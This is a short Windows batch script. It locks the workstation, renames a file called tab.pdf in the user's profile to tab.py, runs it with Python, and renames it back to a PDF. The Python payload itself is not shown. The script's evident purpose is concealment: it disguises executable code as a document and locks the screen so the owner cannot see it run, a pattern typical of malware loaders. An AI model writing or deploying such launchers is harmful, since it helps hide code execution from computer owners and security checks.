@echo off
rundll32.exe user32.dll, LockWorkStation
cd %userprofile%
rename "%userprofile%\tab.pdf" "tab.py"
python.exe "%userprofile%\tab.py"
rename "%userprofile%\tab.py" "tab.pdf"
